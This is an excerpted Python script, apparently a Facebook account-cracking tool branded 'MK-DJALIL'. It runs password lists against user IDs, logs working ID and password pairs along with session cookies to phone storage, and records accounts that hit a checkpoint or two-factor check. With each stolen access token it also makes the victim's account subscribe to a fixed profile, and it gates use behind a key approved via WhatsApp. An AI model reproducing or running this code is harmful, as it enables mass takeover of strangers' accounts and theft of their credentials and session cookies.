...
try:
    ...
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python MK-DJALIL.py')

#------------------[  Ua  ]-------------------#  
def menu():
    print("\n[1] METHOD M1")
    print("[2] METHOD M2")
    print("[3] CONTACT TELEGRAM")
    print("[0] EXIT\n")

    choice = input("[MK-DJALIL] > ").strip()
...
sys.stdout.write('\x1b]2; MK-DJALIL> M1 \x07')
...
def menu():
            ...
            if xd in ['1','01']:
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/MK-DJALIL.txt')
                dino()
                ...
                os.system('xdg-open https://www.facebook.com/MK-DJALILm1')     
            else:
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MK-DJALIL\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                        sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\x1b[1;92m<[MK-DJALIL-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        ...
                                        open('/sdcard/MK-DJALIL_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
                                        open('/sdcard/MK-DJALIL_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/MK-DJALIL-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
              
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\x1b[38;5;246m<[MK-DJALIL-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/MK-DJALIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/MK-DJALIL-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/MK-DJALIL_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MK-DJALIL_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
...
def M_file_4(ids, names, passlist):
	try:
		global ok, loop,  sim_id
		boos = random.choice([P, M, H, K, B, U, O, N])
		sys.stdout.write(f'\r\r\033[1;37m<[{boos}MK-DJALIL\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				print('\r\x1b[1;92m<[MK-DJALIL-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
				open('/sdcard/MK-DJALIL_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
				...
				cookie+=pagevoice
				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
				open('/sdcard/MK-DJALIL_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
...
def approval():
  ...
  try:
    ...
    if 'Napv' in sec:
      boos = random.choice([P, M, H, K, B, U, O, N])
      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}MK-DJALIL+\033[1;32m"+sec.replace('Napv',''))
      print('\033[1;34m─────────────────────────────────────────────')
      ...
      os.system('am start https://wa.me/+213799928221')
      approval()
    if sec=='Apv':menu()
    else:exit()
